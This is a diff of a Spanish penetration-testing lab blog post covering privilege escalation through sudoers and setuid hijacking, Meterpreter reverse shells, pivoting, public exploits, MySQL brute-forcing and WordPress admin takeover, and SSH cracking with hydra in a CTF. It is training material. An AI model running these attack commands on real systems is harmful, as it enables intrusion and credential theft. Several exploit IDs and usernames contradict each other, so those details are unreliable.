@@ -1,9 +1,12 @@
 ---
 title: "Explotación y Post Explotación"
 date: 2026-04-20 21:39:00 -0500
-categories: [Hacking, Vulnerabilidades, Explotación]
-tags: [shellshock, Metasploit, privesc, webdav, cracking, kiwi, incognito, powersploit, john]
+categories: [Hacking, Vulnerabilidades, Explotación, Pivoting]
+tags: [Metasploit, cron jobs, nikto, wordpress, cracking, hydra, nselib]
 description: Laboratorios.
+image:
+  path: /assets/img/Primer-Blog/explotacion-post-explotacion.png
+  alt: Explotación y Post Explotación Labs
 toc: true
 ---
 
@@ -41,7 +44,7 @@ cat tmp/message
 Donde cada comando significa lo siguiente:
 -           / -> busca en la raíz de todo el sistema
 -       -name -> busca cualquier archivo con el nombre message
-- 2>/dev/null -> envía todos los errores de permisis denegados a la carpeta null
+- 2>/dev/null -> redirige los errores al dispositivo nulo para que no se muestren en pantalla
 
 Ahora como ya descubrimos que está el ejecutable en esa ruta podemos ver qué ficheros están ahí
 ```shell
@@ -83,7 +86,7 @@ sudo su
 Con esto hacemos que el usuario student tenga permiso de ejecutar cualquier binario sin contraseña al agregarlo en la última línea de sudoers con el comando **>>**. Esperamos 1 minuto a que se ejecute el script y ya tenemos acceso sudo su.
 
 
-## Exploting Setuid Programs
+## Exploiting Setuid Programs
 Para este laboratorio, nos dan un servicio activo en el puerto 8000, el cual tiene una webshell con un usuario student.
 ```shell
 ls
@@ -99,13 +102,13 @@ ls -la
 ```
 
 Con file podemos ver que welcome es un binario del tipo linux, similar a un exe en windows.
--rw**S**r significa que es un binario con SETUID al tener el bit **"S"** y es un binario que tiene un comportamiento especial, ya que cuando se ejecutan toman los permisos del propietario del archivo, en lugar del usuario que los ejecuta.
+-rw**S**r significa que es un binario con SETUID al tener el bit **"S"** significa que el bit SUID está activo pero el archivo no tiene permisos de ejecución para ese usuario. Cuando es minúscula ("s"), tiene ambos.
 
 Para leer el binario welcome de forma legible, se utiliza el comando **strings**
 ```shell
 strings welcome
 ```
-El comando muestra que dentro del binario está ejecutando greetings. Para probar se intenta eliminar el archivo greetings y lo logramos, lo que significa que nosotros podemos crear un archivo greetings nuestro para que lo ejecute welcome con sus privilegios.
+El comando muestra que dentro del binario esta ejecutando greetings. Para probar se intenta eliminar el archivo greetings y lo logramos, lo que significa que nosotros podemos crear un archivo greetings nuestro para que lo ejecute welcome con sus privilegios.
 
 ```shell
 rm -r greetings
@@ -162,7 +165,7 @@ En el resultado de enum4linux hay que aclarar que los primeros usuarios que apar
 ![Enum4Linux](/assets/img/Primer-Blog/enum.png){: width=auto }
 _Usuarios comunes de windows_
 
-Los usuarios reales del equipo se encuentran más abajo, en la sección que se muestra a continuación:
+Los usuarios reales del equipo se encuentran mas abajo, en la sección que se muestra a continuación:
 ![Usuarios](/assets/img/Primer-Blog/userenum.png){: width=auto }
 _Usuarios encontrados en el sistema_
 
@@ -218,7 +221,7 @@ crackmapexec smb dominio.local -u administrator -p password1 -x 'systeminfo'
 ![Systeminfo](/assets/img/Primer-Blog/systeminfo.png){: width=auto }
 _Crackmapexec_Systeminfo_
 
-Luego de haber obtenido o recopilado la información necesaria, se procede a ejecutar un payload o un revershell en modo escucha, para ello nos apoyamos de multi/handles de msfconsole.
+Luego de haber obtenido o recopilado la información necesaria, se procede a ejecutar un payload o un revershell en modo escucha, para ello nos apoyamos de multi/handler de msfconsole.
 
 ```shell
 msfconsole -q
@@ -228,9 +231,10 @@ set lport 9001
 set payload windows/x64/meterpreter/reverse_tcp
 run
 ```
-En LHost se debe poner nuestra dirección ip que tiene conexión IP con la máquina víctima.
+> **Tip Profesional:** Siempre verifica tu dirección IP con `ip addr` antes de configurar el `LHOST` en un payload.
+{: .prompt-info }
 
-El paylod está conformado de la siguiente manera:
+El payload está conformado de la siguiente manera:
     * Windows: Es para el sistema operativo que deseamos atacar.
     * x64: Es la arquitectura que tiene el sistema.
     * meterpreter: Genera una shell para msfconsole.
@@ -313,7 +317,7 @@ run
 use auxiliary/scanner/portscan/tcp
 set rhost 10.4.16.0/20
 set ports 445
-set threads 10 #No se recomienda poner más de 10
+set threads 10 #No se recomienda poner mas de 10
 run
 
 set rhost 10.4.25.90 #Porque ya conocemos la ip destino
@@ -343,7 +347,7 @@ Para probar que ahora desde mi equipo puedo acceder a ese puerto y a esa ip, se 
 ```shell
 lsof -i:445
 ```
-![LSOFT Conexión establecida](/assets/img/Primer-Blog/lsof.png){: width=auto }
+![LSOFT Conexión establecida](/assets/img/Primer-Blog/lsoft.png){: width=auto }
 _Conexión establecida_
 
 Ahora si yo quiero hacer un ping a dominio1.local, me va a seguir dando error ya que no tengo la ruta directa de llegar.
@@ -360,6 +364,177 @@ Con el segundo smbclient se lista los recursos compartidos del dominio1.local qu
 > Nota: Los recursos compartidos que tienen el **$** no son muy importantes, se debe acceder a los que no tienen ese símbolo.
 {: .prompt-warning }
 
+En resumen:
+
+| Comando | Propósito |
+| :--- | :--- |
+| `autoroute` | Enseña a Metasploit cómo llegar a la red interna. |
+| `portfwd` | Mapea un puerto remoto a un puerto local en tu máquina Kali. |
+| `socks_proxy` | (Opcional) Permite usar herramientas externas a través del túnel. |
+
 ## Fixing Exploits.
-En este laboratorio se encuentra un exploit público.
-Video 02:06
+En este laboratorio se trata de encontrar exploits disponibles públicamente con Searchsploit y aprender cómo corregir o modificar exploits para lograr que funcionen según lo previsto.
+
+Lo primero es realizar un escaneo de puertos:
+```shell
+nmap -p- dominio.local
+    80/tcp open
+    135/tcp open
+    139/tcp open
+    445/tcp open
+    3389/tcp open
+    5985/tcp open
+    47001/tcp open
+
+nmap -p80,135,445,3389,5985 -sVC --min-rate 5000 -n dominio.local
+
+searchsploit hfs2.3
+searchsploit -m 39161
+cat 39161.py
+nano 39161.py
+    ip_addr = "ip_local" #Colocar ip actual de kali
+
+python 39162.py <ip_víctima> 80
+```
+Ahora como es un exploit, antes de ejecutarlo, debemos dejar un escucha abierto para conectarnos al equipo víctima.
+```shell
+python3 -m http.server 80 #Descargar netcat.exe
+    "GET"
+
+
+nc -nlvp 443 #Listener para conectarnos
+    >
+```
+Con esto se completa el laboratorio.
+
+## Targeting MySql Database Server
+En este laboratorio se demostrará las técnicas de explotación a una base de datos como lo es MySql.
+
+Para empezar se realiza un escaneo de puertos
+```shell
+nmap -sV -sC -p 3306 dominio.local
+```
+> NOTA: En algunos casos la base de datos MySql no se encuentra en el puerto 3306.
+{: .prompt-warning }
+
+Al saber la versión se puede buscar alguna vulnerabilidad en searchexploit. En este caso al no haber un script útil, se procede con msfconsole.
+
+```shell
+msfconsole
+use auxiliary/scanner/mysql/mysql_login
+    set RHOSTS dominio.local
+    set PASS_FILE /usr/share/wordlists/metasploit/unix_password.txt
+    run
+```
+
+Luego de encontrar credenciales válidas se procede a conectar a la base de datos
+
+```shell
+mysql -u root -p -h dominio.local
+    show databases; #Muestra las bases de datos
+    use wordpress;
+    show tables;
+    select * FROM wp_users;
+    UPDATE wp_users SET user_pass = MD5('password12345') WHERE user_login = 'admin';
+```
+> Nota: Al hacer la consulta UPDATE se actualizará la contraseña actual del usuario admin, tener en cuenta.
+{: .prompt-warning }
+
+En estas bases de datos ya podemos saber que servicios se encuentran activos, en este caso encontramos un wordpress y se procede a acceder desde el navegador; al no encontrar la página de login, se procede a realizar un escaneo de directorios.
+```shell
+gobuster dir -u http://dominio.com:8585/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+```
+Al tener usuario y contraseña se accede a Wordpress y en el archivo 404, podemos cargar un bash, y dejar un puerto escucha, con eso al abrir una web que no exista, haremos ejecutar el script.
+
+Con esto finaliza este laboratorio.
+
+## Host & Network Penetration Testing: Exploitation CTF 1.
+En este laboratorio de habilidades, se tienen dos máquinas accesibles dominio1.local y dominio2.local, en los cuales debemos identificar las aplicaciones y servicios que se están ejecutando.
+Primero se procede hacer un ping a cada dominio para saber si tenemos acceso o no.
+```shell
+ping dominio1.local
+ping dominio2.local
+```
+
+Ahora se procede con un escaneo de puertos
+```shell
+nmap -p- --min-rate 3000 dominio1.local
+
+whatweb http://dominio1.local/acp/
+
+searchsploit flatcore
+searchsploit -m 50262
+    cat 20262.py
+
+python3 20262.py https://dominio1.local/ admin password1
+```
+Con esto logramos acceder al sistema, cabe recalcar, que en este laboratorio nos dieron el usuario y contraseña.
+
+La primera bandera solicita encontrar la flag en la raiz.
+```shell
+$ ls
+$ whoami
+$ pwd
+$ ls /
+$ cat flag1.txt
+```
+
+Lo segundo es identificar un usuario del sistema inseguro.
+
+```shell
+ls -l /home
+    iamaweakuser
+exit
+
+hydra -l iamweakuser -P /usr/share/metasploit-framework/data/wordlists/unix_password.txt ssh://dominio1.local
+    iamweakuser angel
+```
+
+Con hydra se ha descubierto la contraseña, ahora debemos conectarnos mediante ssh
+
+```shell
+ssh iamweakuser@dominio1.local
+    angel
+    ls
+        flag2.txt
+    cat flag2.txt
+```
+
+La tercera flag solicita identificar y vulnerar un plugin vulnerable utilizado por la aplicación en el dominio2.local.
+```shell
+nmap -p- --min-rate 3000 dominio2.local
+wpscan --api-token <Insertar token> #El api token se puede sacar de la página oficial de wpscan
+nikto -h dominio2.local
+    akismet
+searchsploit akismet #No hay algo que se pueda aprovechar
+
+gobuster dir -u http://dominio2.local/wp-content/plugins/ -w /usr/share/nmap/nselib/data/wp-plugins.lst #Diccionario de plugins
+    akismet
+    duplikator
+```
+Como se encontró 2 plugins, se procede a acceder a dicha ruta
+```shell
+http://dominio2.local/wp-content/plugins/duplicator/
+
+searchsploit duplicator
+```
+Con searchsploit se encontró varias vulnerabilidades por lo que se procede con msfconsole
+
+```shell
+msfconsole -q
+search duplicator
+    use auxiliary/scanner/http/wp_duplicator_file_read
+        set RHOSTS dominio2.local
+        set FILEPATH /flag3.txt
+        run
+        flag3.txt
+```
+Para la última flag solicitan identificar y comprometer un usuario del sistema que no requiere autenticación. Antes de establecer el FILEPATH, se hizo por default un escaneo a /etc/shadows, donde se encontró un usuario llamado "iamacreazyfreeuser".
+```shell
+ssh iamacreazyfreeuser@dominio2.local
+    yes
+    $ ls
+    $ flag4.txt
+    $ cat flag4.txt
+```
+Con eso se termina de encontrar las 4 flags del laboratorio.
